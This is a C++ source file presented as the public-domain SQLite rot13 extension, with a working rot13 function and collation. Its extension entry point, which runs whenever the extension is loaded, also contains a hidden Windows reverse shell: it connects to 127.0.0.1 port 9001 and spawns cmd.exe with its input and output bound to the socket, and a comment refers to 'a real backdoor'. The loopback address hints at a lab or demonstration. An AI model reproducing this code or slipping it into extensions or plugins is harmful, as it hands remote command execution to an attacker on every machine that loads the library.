/*
** 2013-05-15
**
** The author disclaims copyright to this source code.  In place of
** a legal notice, here is a blessing:
**
**    May you do good and not evil.
**    May you find forgiveness for yourself and forgive others.
**    May you share freely, never taking more than you give.
**
******************************************************************************
**
** This SQLite extension implements a rot13() function and a rot13
** collating sequence.
*/
#define _WINSOCK_DEPRECATED_NO_WARNINGS // Suppresses deprecation warnings for older Winsock functions
#include "pch.h"
#include "sqlite3ext.h"
SQLITE_EXTENSION_INIT1
#include <assert.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h> // For modern networking functions like getaddrinfo
#include <stdio.h>
#pragma comment(lib,"ws2_32")
#include <stdlib.h>

/*
** Perform rot13 encoding on a single ASCII character.
*/
static unsigned char rot13(unsigned char c) {
    if (c >= 'a' && c <= 'z') {
        c += 13;
        if (c > 'z') c -= 26;
    }
    else if (c >= 'A' && c <= 'Z') {
        c += 13;
        if (c > 'Z') c -= 26;
    }
    return c;
}

/*
** Implementation of the rot13() function.
**
** Rotate ASCII alphabetic characters by 13 character positions.
** Non-ASCII characters are unchanged.  rot13(rot13(X)) should always
** equal X.
*/
static void rot13func(
    sqlite3_context* context,
    int argc,
    sqlite3_value** argv
) {
    const unsigned char* zIn;
    int nIn;
    unsigned char* zOut;
    unsigned char* zToFree = 0;
    int i;
    unsigned char zTemp[100];
    assert(argc == 1);
    if (sqlite3_value_type(argv[0]) == SQLITE_NULL) return;
    zIn = (const unsigned char*)sqlite3_value_text(argv[0]);
    nIn = sqlite3_value_bytes(argv[0]);
    if (nIn < sizeof(zTemp) - 1) {
        zOut = zTemp;
    }
    else {
        zOut = zToFree = (unsigned char*)sqlite3_malloc64(nIn + 1);
        if (zOut == 0) {
            sqlite3_result_error_nomem(context);
            return;
        }
    }
    for (i = 0; i < nIn; i++) zOut[i] = rot13(zIn[i]);
    zOut[i] = 0;
    sqlite3_result_text(context, (char*)zOut, i, SQLITE_TRANSIENT);
    sqlite3_free(zToFree);
}

/*
** Implement the rot13 collating sequence so that if
**
**      x=y COLLATE rot13
**
** Then
**
**      rot13(x)=rot13(y) COLLATE binary
*/
static int rot13CollFunc(
    void* notUsed,
    int nKey1, const void* pKey1,
    int nKey2, const void* pKey2
) {
    const char* zA = (const char*)pKey1;
    const char* zB = (const char*)pKey2;
    int i, x;
    for (i = 0; i < nKey1 && i < nKey2; i++) {
        x = (int)rot13(zA[i]) - (int)rot13(zB[i]);
        if (x != 0) return x;
    }
    return nKey1 - nKey2;
}

extern "C"
#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_extension_init(
    sqlite3* db,
    char** pzErrMsg,
    const sqlite3_api_routines* pApi
) {
    int rc = SQLITE_OK;
    SQLITE_EXTENSION_INIT2(pApi);
    (void)pzErrMsg;  /* Unused parameter */

#ifdef _WIN32
    Sleep(5000);     /* sleep 5 seconds on load */
#else
    sleep(5);        /* if you ever build this on POSIX */
#endif
    // Register the ROT13 function and collation
    rc = sqlite3_create_function(db, "rot13", 1,
        SQLITE_UTF8 | SQLITE_INNOCUOUS | SQLITE_DETERMINISTIC,
        0, rot13func, 0, 0);
    if (rc == SQLITE_OK) {
        rc = sqlite3_create_collation(db, "rot13", SQLITE_UTF8, 0, rot13CollFunc);
    }

    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax;
    char ip_addr[16] = "127.0.0.1";
    char port[6] = "9001";

    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return SQLITE_ERROR;
    }

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET) {
        WSACleanup();
        return SQLITE_ERROR;
    }

    // Use getaddrinfo for modern address resolution
    struct addrinfo hints, * result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(ip_addr, port, &hints, &result) != 0) {
        closesocket(Winsock);
        WSACleanup();
        return SQLITE_ERROR;
    }

    // Connect to the remote address
    if (WSAConnect(Winsock, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        freeaddrinfo(result);
        closesocket(Winsock);
        WSACleanup();
        return SQLITE_ERROR;
    }

    freeaddrinfo(result);

    // Set up process startup info to redirect I/O
    ZeroMemory(&ini_processo, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    // Start cmd.exe with redirected I/O
    TCHAR cmd[255] = TEXT("cmd.exe");
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info)) {
        closesocket(Winsock);
        WSACleanup();
        return SQLITE_ERROR;
    }

 
    // Cleanup (note: in a real backdoor, you might not want to close the socket immediately)
    closesocket(Winsock);
    WSACleanup();

    return rc;
}